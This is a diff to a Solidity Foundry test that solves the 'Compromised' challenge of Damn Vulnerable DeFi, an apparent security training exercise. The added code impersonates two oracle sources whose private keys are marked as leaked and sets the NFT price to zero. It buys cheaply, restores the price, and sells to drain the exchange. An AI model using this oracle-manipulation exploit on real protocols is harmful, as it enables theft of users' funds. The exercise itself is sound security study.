@@ -10,6 +10,9 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+// adding
+import {CompromisedExploit} from "./CompromisedExploit.sol";
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -22,8 +25,8 @@ contract CompromisedChallenge is Test {
 
 
     address[] sources = [
-        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
-        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // 私钥泄露
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // 私钥泄露
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
@@ -75,7 +78,36 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        CompromisedExploit compromisedExploit = new CompromisedExploit(oracle, exchange, nft, recovery);
+
+        // 操纵预言机: 降低价格
+        // foundry test中不用私钥，实际此处需要私钥
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        uint256 price = oracle.getMedianPrice(symbols[0]);
+        console.log("before price: ", price);
+        // 低买
+        uint256 id = compromisedExploit.buy{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        // // 操纵预言机：恢复价格
+        vm.startPrank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
         
+        price = oracle.getMedianPrice(symbols[0]);
+        console.log("after price: ", price);
+        // 高卖并转给recovery
+        compromisedExploit.sellAndSend(id, EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
